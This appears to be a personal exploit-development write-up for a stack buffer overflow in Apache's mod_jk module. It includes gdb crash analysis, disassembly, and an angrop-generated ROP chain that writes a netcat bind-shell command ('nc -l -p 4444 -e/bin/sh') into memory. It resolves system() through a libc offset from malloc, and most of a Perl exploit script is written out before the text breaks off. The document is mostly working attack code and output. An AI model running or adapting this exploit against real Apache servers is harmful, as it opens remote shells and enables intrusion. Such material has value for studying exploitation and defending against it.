# modjk exploit


## Analysis

I started with the following perl code:
```
$buf = "A" x 4123;

$ropchain = "";
$ropchain .= pack("V", 0x43434343);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x45454545);

$uri = $buf . $ropchain;

# URL Encode
$uri =~ s/([^A-Za-z0-9\/])/sprintf("%%%02X", ord($1))/seg;

$request = "GET /${uri} HTTP/1.0\n\n";
print $request;
```

This is the result:
```
(gdb) run -X
Starting program: /usr/sbin/httpd -X
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Program received signal SIGSEGV, Segmentation fault.
0xb7043863 in map_uri_to_worker (uw_map=0x44444444,
    uri=0x86188e0 "/", 'A' <repeats 199 times>..., l=0x0)
    at jk_uri_worker_map.c:510
510	jk_uri_worker_map.c: No such file or directory.
(gdb) i r
eax            0x0	0x0
ecx            0x44444444	0x44444444
edx            0x0	0x0
ebx            0xb705d73c	0xb705d73c
esp            0xbf908630	0xbf908630
ebp            0xbf909678	0xbf909678
esi            0x1028	0x1028
edi            0x86188e0	0x86188e0
eip            0xb7043863	0xb7043863 <map_uri_to_worker+339>
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	0x73
ss             0x7b	0x7b
ds             0x7b	0x7b
es             0x7b	0x7b
fs             0x0	0x0
gs             0x33	0x33
(gdb)                                                       

(gdb) x/16x $ebx
0xb705d73c:	0x00033660	0x00000000	0x00000000	0xb70395d0
0xb705d74c <ajp14_unmarshal_context_info@got.plt>:	0xb7045290	0xb74b84fc	0xb70376e0	0xb7038500
0xb705d75c <jk_shutdown_socket@got.plt>:	0xb7037140	0xb7037850	0xb7039b50	0x080683af
0xb705d76c <jk_map_name_at@got.plt>:	0xb70418c0	0xb7275770	0xb70399b0	0xb7038460

(gdb) x/16x $esp                                                                                                        0xbf908630:	0x086188e0	0xb7056967	0x00000000	0x00000000
0xbf908640:	0x00000000	0x00000000	0x00000000	0x00000000
0xbf908650:	0x00000000	0x00000000	0x00000000	0x00000000
0xbf908660:	0x4141412f	0x41414141	0x41414141	0x41414141

(gdb) x/16x $ebp
0xbf909678:	0x41414141	0x43434343	0x44444444	0x45454545
0xbf909688:	0x00000000	0xbf9096d0	0x00000000	0x00000018
0xbf909698:	0xbf909738	0xb70ecd96	0x08610cf0	0xb70ed3a9
0xbf9096a8:	0x08619988	0xb74b3739	0x086199a8	0x0858e520
(gdb)

```

Check the function where it breaks:
```
Dump of assembler code for function map_uri_to_worker:
   0xb7043710 <+0>:	push   ebp
   0xb7043711 <+1>:	mov    ebp,esp
   0xb7043713 <+3>:	xor    eax,eax
   0xb7043715 <+5>:	push   edi
   0xb7043716 <+6>:	push   esi
   0xb7043717 <+7>:	push   ebx
   0xb7043718 <+8>:	call   0xb70349f9 <__i686.get_pc_thunk.bx>
   0xb704371d <+13>:	add    ebx,0x1a01f
   0xb7043723 <+19>:	sub    esp,0x103c
   0xb7043729 <+25>:	mov    DWORD PTR [ebp-0x101c],eax
   0xb704372f <+31>:	mov    eax,DWORD PTR [ebp+0x10]
   0xb7043732 <+34>:	mov    edi,DWORD PTR [ebp+0xc]
   0xb7043735 <+37>:	test   eax,eax
   0xb7043737 <+39>:	je     0xb7043747 <map_uri_to_worker+55>
   0xb7043739 <+41>:	mov    eax,DWORD PTR [ebp+0x10]
   0xb704373c <+44>:	mov    eax,DWORD PTR [eax+0x4]
   0xb704373f <+47>:	test   eax,eax
   0xb7043741 <+49>:	je     0xb7043d4d <map_uri_to_worker+1597>
   0xb7043747 <+55>:	mov    eax,DWORD PTR [ebp+0x8]
   0xb704374a <+58>:	test   eax,eax
   0xb704374c <+60>:	je     0xb7043cd8 <map_uri_to_worker+1480>
   0xb7043752 <+66>:	test   edi,edi
---Type <return> to continue, or q <return> to quit---
   0xb7043754 <+68>:	je     0xb7043cd8 <map_uri_to_worker+1480>
   0xb704375a <+74>:	cmp    BYTE PTR [edi],0x2f
   0xb704375d <+77>:	je     0xb70437ed <map_uri_to_worker+221>
   0xb7043763 <+83>:	mov    DWORD PTR [esp+0x18],edi
   0xb7043767 <+87>:	mov    ecx,DWORD PTR [ebp+0x10]
   0xb704376a <+90>:	lea    eax,[ebx-0x4300]
   0xb7043770 <+96>:	mov    DWORD PTR [esp+0x14],eax
   0xb7043774 <+100>:	lea    edi,[ebx-0x43da]
   0xb704377a <+106>:	lea    esi,[ebx-0x4530]
   0xb7043780 <+112>:	mov    DWORD PTR [esp],ecx
   0xb7043783 <+115>:	mov    DWORD PTR [esp+0x10],0x3
   0xb704378b <+123>:	mov    DWORD PTR [esp+0xc],edi
   0xb704378f <+127>:	mov    DWORD PTR [esp+0x8],0x1e8
   0xb7043797 <+135>:	mov    DWORD PTR [esp+0x4],esi
   0xb704379b <+139>:	call   0xb702f420 <jk_log@plt>
   0xb70437a0 <+144>:	mov    ecx,DWORD PTR [ebp+0x10]
   0xb70437a3 <+147>:	test   ecx,ecx
   0xb70437a5 <+149>:	je     0xb70437b1 <map_uri_to_worker+161>
   0xb70437a7 <+151>:	mov    eax,DWORD PTR [ebp+0x10]
   0xb70437aa <+154>:	mov    edx,DWORD PTR [eax+0x4]
   0xb70437ad <+157>:	test   edx,edx
   0xb70437af <+159>:	je     0xb70437be <map_uri_to_worker+174>
   0xb70437b1 <+161>:	xor    eax,eax
---Type <return> to continue, or q <return> to quit---
   0xb70437b3 <+163>:	add    esp,0x103c
   0xb70437b9 <+169>:	pop    ebx
   0xb70437ba <+170>:	pop    esi
   0xb70437bb <+171>:	pop    edi
   0xb70437bc <+172>:	pop    ebp
   0xb70437bd <+173>:	ret    
   0xb70437be <+174>:	mov    DWORD PTR [esp+0x10],0x0
   0xb70437c6 <+182>:	lea    eax,[ebx-0x8f50]
   0xb70437cc <+188>:	mov    DWORD PTR [esp+0x14],eax
   0xb70437d0 <+192>:	mov    DWORD PTR [esp+0xc],edi
   0xb70437d4 <+196>:	mov    DWORD PTR [esp+0x8],0x1ea
   0xb70437dc <+204>:	mov    DWORD PTR [esp+0x4],esi
   0xb70437e0 <+208>:	mov    edx,DWORD PTR [ebp+0x10]
   0xb70437e3 <+211>:	mov    DWORD PTR [esp],edx
   0xb70437e6 <+214>:	call   0xb702f420 <jk_log@plt>
   0xb70437eb <+219>:	jmp    0xb70437b1 <map_uri_to_worker+161>
   0xb70437ed <+221>:	xor    esi,esi
   0xb70437ef <+223>:	nop
   0xb70437f0 <+224>:	mov    DWORD PTR [esp],edi
   0xb70437f3 <+227>:	call   0xb702f520 <strlen@plt>
   0xb70437f8 <+232>:	cmp    esi,eax
   0xb70437fa <+234>:	jae    0xb704380e <map_uri_to_worker+254>
   0xb70437fc <+236>:	movzx  eax,BYTE PTR [esi+edi*1]
---Type <return> to continue, or q <return> to quit---
   0xb7043800 <+240>:	cmp    al,0x3b
   0xb7043802 <+242>:	je     0xb704380e <map_uri_to_worker+254>
   0xb7043804 <+244>:	mov    BYTE PTR [esi+ebp*1-0x1018],al
   0xb704380b <+251>:	inc    esi
   0xb704380c <+252>:	jmp    0xb70437f0 <map_uri_to_worker+224>
   0xb704380e <+254>:	mov    DWORD PTR [esp],edi
   0xb7043811 <+257>:	xor    eax,eax
   0xb7043813 <+259>:	mov    BYTE PTR [esi+ebp*1-0x1018],al
   0xb704381a <+266>:	lea    eax,[ebx-0x6dd5]
   0xb7043820 <+272>:	mov    DWORD PTR [esp+0x4],eax
   0xb7043824 <+276>:	call   0xb702f510 <strstr@plt>
   0xb7043829 <+281>:	test   eax,eax
   0xb704382b <+283>:	je     0xb7043860 <map_uri_to_worker+336>
   0xb704382d <+285>:	lea    ecx,[ebp-0x1018]
   0xb7043833 <+291>:	mov    edx,eax
   0xb7043835 <+293>:	sub    edx,ecx
   0xb7043837 <+295>:	cmp    edx,0xfff
   0xb704383d <+301>:	jbe    0xb7043844 <map_uri_to_worker+308>
   0xb704383f <+303>:	mov    edx,0xfff
   0xb7043844 <+308>:	mov    BYTE PTR [edx+ebp*1-0x1018],0x0
   0xb704384c <+316>:	mov    edx,DWORD PTR [ebp+0x10]
   0xb704384f <+319>:	test   edx,edx
   0xb7043851 <+321>:	je     0xb7043860 <map_uri_to_worker+336>
---Type <return> to continue, or q <return> to quit---
   0xb7043853 <+323>:	mov    edx,DWORD PTR [ebp+0x10]
   0xb7043856 <+326>:	cmp    DWORD PTR [edx+0x4],0x1
   0xb704385a <+330>:	jle    0xb7043c95 <map_uri_to_worker+1413>
   0xb7043860 <+336>:	mov    ecx,DWORD PTR [ebp+0x8]
=> 0xb7043863 <+339>:	mov    eax,DWORD PTR [ecx+0x2040]
   0xb7043869 <+345>:	test   eax,eax
   0xb704386b <+347>:	jne    0xb7043c81 <map_uri_to_worker+1393>
   0xb7043871 <+353>:	mov    eax,DWORD PTR [ebp+0x10]
   0xb7043874 <+356>:	test   eax,eax
```

The relevant part is:
```
   0xb7043860 <+336>:	mov    ecx,DWORD PTR [ebp+0x8]
=> 0xb7043863 <+339>:	mov    eax,DWORD PTR [ecx+0x2040]
```

Lets check where it is pointing to:
```
(gdb) x/8x $ebp+8
0xbf909680:	0x44444444	0x45454545	0x00000000	0xbf9096d0
0xbf909690:	0x00000000	0x00000018	0xbf909738	0xb70ecd96

(gdb) x/8x $ebp+0x10
0xbf909688:	0x00000000	0xbf9096d0	0x00000000	0x00000018
0xbf909698:	0xbf909738	0xb70ecd96	0x08610cf0	0xb70ed3a9
```

So, we control ecx and eax.

The code tries to read the value of the memory address stored in ebp+0x8, which we
can control, into eax. If eax is not zero, it will jump to 0xb7043c81.

0xb7043c81:
```
(gdb) x/4i 0xb7043c81
   0xb7043c81 <map_uri_to_worker+1393>:	mov    DWORD PTR [esp],ecx
   0xb7043c84 <map_uri_to_worker+1396>:	mov    eax,DWORD PTR [ebp+0x10]
   0xb7043c87 <map_uri_to_worker+1399>:	mov    DWORD PTR [esp+0x4],eax
   0xb7043c8b <map_uri_to_worker+1403>: call   0xb702fc10 <uri_worker_map_update@plt>
```

and then, 0xb702fc10:
```
(gdb) x/1i 0xb702fc10
   0xb702fc10 <uri_worker_map_update@plt>:	jmp    DWORD PTR [ebx+0x408]

(gdb) x/4x $ebx+0x408
   0xb705db44 <uri_worker_map_update@got.plt>:	0xb7044010	0x0807168b	0xb72a6e70	0xb70366f0
```

So, it jumps on an address referenced via EBX, which we dont control. Looks like a dead end.

What we need is to be able to either:
- Write some bytes (defined by the payload)
- Or jump to an address (defined by the payload)
- Or make payload so that the function returns (we have overwritten saved ESP)
- find something somewhere else
- analyze source code to understand what it is exactly doing



Analyze mod_jk:
```
$ scp user@192.168.2.136:/usr/lib/httpd/modules/mod_jk.so Desktop/modjk/

-> 0x19863A
```

## Getting EIP control

I used several iterations of this:
```
$ropchain = "";
$ropchain .= pack("V", 0x43434343);   # ebp+4
$ropchain .= pack("V", 0x8097010);   # ebp+8
$ropchain .= pack("V", 0x45454545);   # ebp+c
$ropchain .= pack("V", 0x46464646);   # ebp+0x10
$ropchain .= pack("V", 0x47474747);   # ebp+0x14

Program received signal SIGSEGV, Segmentation fault.
0xb700587b in map_uri_to_worker (uw_map=0x8097010,
    uri=0x9b718e0 "/", 'A' <repeats 199 times>..., l=0x46464646)
    at jk_uri_worker_map.c:512
512	jk_uri_worker_map.c: No such file or directory.
(gdb) x/8i 0xb700587b
=> 0xb700587b <map_uri_to_worker+363>:	cmp    DWORD PTR [edx+0x4],0x1
   0xb700587f <map_uri_to_worker+367>:	jle    0xb7005c35 <map_uri_to_worker+1317>
   0xb7005885 <map_uri_to_worker+373>:	mov    eax,DWORD PTR [ebp+0x8]
   0xb7005888 <map_uri_to_worker+376>:	xor    esi,esi
   0xb700588a <map_uri_to_worker+378>:	mov    edx,DWORD PTR [eax+0x201c]
   0xb7005890 <map_uri_to_worker+384>:	cmp    esi,edx
   0xb7005892 <map_uri_to_worker+386>:	jae    0xb700596d <map_uri_to_worker+605>
   0xb7005898 <map_uri_to_worker+392>:	nop
(gdb) i r edx
edx            0x46464646	0x46464646
```

After some hours without advancing getting somewhere, i decided to
reduce the overflow, so it does not overwrite the function parameters of `map_uri_to_worker`.

Immediate success to control EIP:

```
$ropchain = "";
$ropchain .= pack("V", 0x43434343);   # ebp+4
```

With this output:
```
(gdb) run -X
Starting program: /usr/sbin/httpd -X
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
(gdb) i r
eax            0x0	0x0
ecx            0x8714a00	0x8714a00
edx            0x0	0x0
ebx            0x41414141	0x41414141
esp            0xbff85140	0xbff85140
ebp            0x41414141	0x41414141
esi            0x41414141	0x41414141
edi            0x41414141	0x41414141
eip            0x43434343	0x43434343
eflags         0x10282	[ SF IF RF ]
cs             0x73	0x73
ss             0x7b	0x7b
ds             0x7b	0x7b
es             0x7b	0x7b
fs             0x0	0x0
gs             0x33	0x33
(gdb) x/8x $esp-0x4
0xbfa3e8fc:	0x43434343	0x09a78a00	0x09aef8e0	0x00000000

(gdb) x/32x $ecx
0x8fdba00:	0x00000000	0x00002051	0x00001000	0x00000000
0x8fdba10:	0x08fdba20	0x00000000	0x00000000	0x00000000
```

After some messing around, i could add data after saved-EIP, while still be
able to crash at EIP=0x41414141:
```
$ropchain = "";
$ropchain .= pack("V", 0x41414141);   # ebp+4 == SIP
$ropchain .= pack("V", 0x8097010);    # -> point to RW null value
$ropchain .= pack("V", 0x42424242);   # ok, no influence
$ropchain .= pack("V", 0x8097180);    # -> point to RW non-null value
$ropchain .= pack("V", 0x45454546);   #
$ropchain .= pack("V", 0x45454547);   #
$ropchain .= pack("V", 0x45454548);   #
$ropchain .= pack("V", 0x44444444);   #
$ropchain .= pack("V", 0x44444444);   #
$ropchain .= pack("V", 0x44444444);   #
$ropchain .= pack("V", 0x44444444);   #

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

(gdb) x/1x 0x8097010
0x8097010:	0x00000000
(gdb) x/1x 0x8097180
0x8097180:	0x08af1998
```

I think this was the "hard" part of the exploit. I added values until it crashed
at another place, analyzing the code (e.g. if it is writing or reading), and
then providing a useful value. With the values above, the function (surprisingly)
exits "normally", and then tried to return to the overwritten saved EIP.

Now we can use ROP to jump over the "required" values, by just popping them:
```
# httpd:
# 0x08060ab2: pop ebp; ret;

$ropchain = "";
$ropchain .= pack("V", 0x08060ab2);   # SIP; pop ebp; ret
$ropchain .= pack("V", 0x8097010);    # point to null value
$ropchain .= pack("V", 0x08060ab2);   # pop ebp; ret
$ropchain .= pack("V", 0x8097180);    # point to non-null value
$ropchain .= pack("V", 0x45454546);   # -> should crash here
$ropchain .= pack("V", 0x45454547);   #
$ropchain .= pack("V", 0x45454548);   #
$ropchain .= pack("V", 0x44444444);   #
$ropchain .= pack("V", 0x44444444);   #
$ropchain .= pack("V", 0x44444444);   #
$ropchain .= pack("V", 0x44444444);   #

Program received signal SIGSEGV, Segmentation fault.
0x45454546 in ?? ()
```

So we can now execute code via ROP.

## Exploit plan

Write a netcat command line into an RW area, resolve address of system(), and
call system() with the address of the netcat command line.


## Write() shellcode

Lets write the netcat command line "nc -l -p 4444 -e /bin/sh" to a static location.

Checking the process to find an writeable location:
```
(gdb) info proc mappings
process 1420
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8094000    0x4c000        0x0 /usr/sbin/httpd
	 0x8094000  0x8097000     0x3000    0x4b000 /usr/sbin/httpd
-> 0x8097000  0x809a000     0x3000        0x0
	 0x9dcd000  0x9edc000   0x10f000        0x0 [heap]
```
The address 0x8097000 is looking good.


Lets use angrop to create the write() shellcode. To create this manually would
take some time, as not many good gadgets are available.

Note: The length of the string we write needs to be multiple of 4.
Address where we write to should not contain null bytes.

Angrop:
```
(angr) dobin@minime:~/Desktop/modjk$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import angr, angrop
>>> p = angr.Project("./httpd")
>>> rop = p.analyses.ROP()
WARNING | 2016-08-20 14:15:01,741 | angrop.rop | Enabling fast mode for large binary
>>> rop.find_gadgets()


>>> chain = rop.write_to_mem(0x8097010+0x68, "/bin/busybox nc -l -p 4444 -e/bin/sh")
>>> chain.payload_str();
>>> chain.print_payload_code()
chain = ""
chain += p32(0x80647c1)	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
chain += p32(0x6e69622f)
chain += p32(0x8097010)
chain += p32(0x0)
chain += p32(0x80808f9)	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80647c1)	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
chain += p32(0x7375622f)
chain += p32(0x8097014)
chain += p32(0x0)
chain += p32(0x80808f9)	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80647c1)	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
chain += p32(0x786f6279)
chain += p32(0x8097018)
chain += p32(0x0)
chain += p32(0x80808f9)	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80647c1)	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
chain += p32(0x20636e20)
chain += p32(0x809701c)
chain += p32(0x0)
chain += p32(0x80808f9)	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80647c1)	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
chain += p32(0x2d206c2d)
chain += p32(0x8097020)
chain += p32(0x0)
chain += p32(0x80808f9)	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80647c1)	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
chain += p32(0x34342070)
chain += p32(0x8097024)
chain += p32(0x0)
chain += p32(0x80808f9)	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80647c1)	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
chain += p32(0x2d203434)
chain += p32(0x8097028)
chain += p32(0x0)
chain += p32(0x80808f9)	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80647c1)	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
chain += p32(0x69622f65)
chain += p32(0x809702c)
chain += p32(0x0)
chain += p32(0x80808f9)	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x80647c1)	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
chain += p32(0x68732f6e)
chain += p32(0x8097030)
chain += p32(0x0)
chain += p32(0x80808f9)	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
chain += p32(0x0)
chain += p32(0x0)
chain += p32(0x0)
```

Mad search/replace skills to convert it to perl:
```
chain = ""
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x6e69622f);
$ropchain .= pack("V", 0x8097010);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x7375622f);
$ropchain .= pack("V", 0x8097014);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x786f6279);
$ropchain .= pack("V", 0x8097018);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x20636e20);
$ropchain .= pack("V", 0x809701c);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x2d206c2d);
$ropchain .= pack("V", 0x8097020);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x34342070);
$ropchain .= pack("V", 0x8097024);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x2d203434);
$ropchain .= pack("V", 0x8097028);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x69622f65);
$ropchain .= pack("V", 0x809702c);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x68732f6e);
$ropchain .= pack("V", 0x8097030);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);

$ropchain .= pack("V", 0x45454546);   #
```

Result:
```
Program received signal SIGSEGV, Segmentation fault.
0x45454546 in ?? ()
(gdb) printf "%s\n", 0x8097010+0x68,
/bin/busybox nc -l -p 4444 -e/bin/sh
```

## finding address of mallloc()

Check address of malloc as imported in httpd:
```
dobin@minime:~/Desktop/modjk$ objdump -R httpd | grep malloc
080945cc R_386_JUMP_SLOT   apr_rmm_malloc
0809461c R_386_JUMP_SLOT   malloc@GLIBC_2.0
^ address
```

Note: the following commands need to be executed after malloc() get resolved by httpd. So it is not enough just to do "gdb httpd", but you have to attach to a running httpd process.

Address of malloc inside the plt:
```
(gdb) x/1x 0x0809461c
0x809461c <malloc@got.plt>:	0xb7262160
```

Address of malloc in libc mapped in process:
```
(gdb) x/1x 0xb7262160
0xb7262160 <malloc>:	0x0ce85356
```

Looks correct, address 0xb7262160 has the symbol "malloc".

## finding address of system()

Check the addresses of system and malloc in libc:
```
user@tinysploit2:~$ objdump -T /lib/libc-2.17.so | egrep "malloc|system"
...
00079160 g    DF .text	00000136  GLIBC_2.0   malloc
0003f1a0  w   DF .text	0000008d  GLIBC_2.0   system
...
```

Calculate offset between malloc and system:
```
dobin@minime:~/Desktop/modjk$ printf "%x\n" $((0x00079160-0x0003f1a0))
39fc0
```

Test the offset while debugging httpd:

Get again the address of malloc in the PLT, via the import, as seen above.
Then, subtract the offset from it:
```
(gdb) x/1x 0x0809461c
0x809461c <malloc@got.plt>:	0xb7262160

(gdb) x/1x 0xb7262160-0x39fc0
0xb72281a0 <system>:	0x891cec83
```

Success!


Therefore:

So, to get address of system in the exploit in the address space of httpd:
- get address of malloc: `mov reg, [0xb7262160]`
- mov offset to system to a register: `mov reg2, 39fc0`
- `add reg2, reg`, so reg2 has now the execl() offset


I use this gadget for add:
```
0x080755e8: add edx, dword ptr [eax + 4]; mov eax, edx; ret;
```

The httpd binary does not have a lot of good gadgets. I had to mess around
a lot, but at the end i arrived at this:
```
# offset -> esi
0x08060b11: pop esi; pop ebp; ret;
0xoffset
fakeebp

# esi -> eax
0x0806f527: mov eax, esi; pop esi; pop ebp; ret;
fakeesi
fakeebp

# xor eax
0x08061233: xor eax, 0x89080891; ret;

# mov eax to edx
0x08078b2f: mov edx, eax; mov eax, edx; pop ebp; ret;
fake ebp


# addr -> esi
0x08060b11: pop esi; pop ebp; ret;
0xaddrmalloc
fakeebp

# esi -> eax
0x0806f527: mov eax, esi; pop esi; pop ebp; ret;
fakeesi
fakeebp

# add [eax+4] to edx
0x080755e8: add edx, dword ptr [eax + 4]; mov eax, edx; ret;


# call edx (or eax)
0x08060a44: call edx;
```

## putting it together

```
# root pw: x/64x$ESP
#
#
# Shutdown Apache using:
# httpd -k stop
#
# Use GDB to debug httpd:
# gdb httpd
# (gdb) run -X



#!/usr/bin/perl

$| = 1;               # turn off output buffering

$buf = "A" x 4123; # Orig

# httpd:
# 0x08060ab2: pop ebp; ret;
# rw:
# 	 0x8097000  0x809a000     0x3000        0x0

# stack flip part
$ropchain = "";
$ropchain .= pack("V", 0x08060ab2);   # pop ebp
$ropchain .= pack("V", 0x8097010);   # point to null value
$ropchain .= pack("V", 0x08060ab2);   # pop ebp
$ropchain .= pack("V", 0x8097180);   # point to non-null value

# write "/bin/busybox nc -l -p 4444 -e/bin/sh" to address 0x8097010+0x68
# generated by angrop
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x6e69622f);
$ropchain .= pack("V", 0x8097010);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x7375622f);
$ropchain .= pack("V", 0x8097014);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x786f6279);
$ropchain .= pack("V", 0x8097018);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x20636e20);
$ropchain .= pack("V", 0x809701c);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x2d206c2d);
$ropchain .= pack("V", 0x8097020);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80808f9);	# mov dword ptr [esi + 0x68], ebx; pop ebx; pop esi; pop ebp; nop ; ret
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x44444444);
$ropchain .= pack("V", 0x80647c1);	# mov eax, ebx; pop ebx; pop esi; pop ebp; ret
$ropchain .= pack("V", 0x34342070);
$ropchain .= pack("V", 0x8097024);
$ropchain .= pack("V", 0x44444444);
